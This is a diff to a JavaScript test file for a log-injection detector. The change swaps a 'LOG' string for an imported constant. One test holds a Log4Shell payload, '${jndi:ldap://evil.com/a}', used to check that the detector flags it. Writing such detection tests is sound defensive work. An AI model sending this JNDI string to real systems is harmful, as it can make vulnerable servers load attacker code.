@@ -6,10 +6,10 @@
  * null byte injection, and ANSI escape sequences.
  */
 
-import { isUnsafe, whyUnsafe } from '../src/index.js';
+import { isUnsafe, whyUnsafe, LOG } from '../src/index.js';
 
-const unsafe = (v) => expect(isUnsafe(v, 'LOG')).toBe(true,  `expected UNSAFE: ${v}`);
-const safe   = (v) => expect(isUnsafe(v, 'LOG')).toBe(false, `expected SAFE:   ${v}`);
+const unsafe = (v) => expect(isUnsafe(v, LOG)).toBe(true,  `expected UNSAFE: ${v}`);
+const safe   = (v) => expect(isUnsafe(v, LOG)).toBe(false, `expected SAFE:   ${v}`);
 
 // ─── CRLF injection ─────────────────────────────────────────────────────────
 
@@ -76,7 +76,7 @@ describe('LOG context — Log4Shell / JNDI injection', () => {
   });
 
   it('identifies Log4Shell via whyUnsafe', () => {
-    const result = whyUnsafe('${jndi:ldap://evil.com/a}', 'LOG');
+    const result = whyUnsafe('${jndi:ldap://evil.com/a}', LOG);
     expect(result).not.toBeNull();
     expect(result.id).toBe('log-log4shell-jndi');
   });
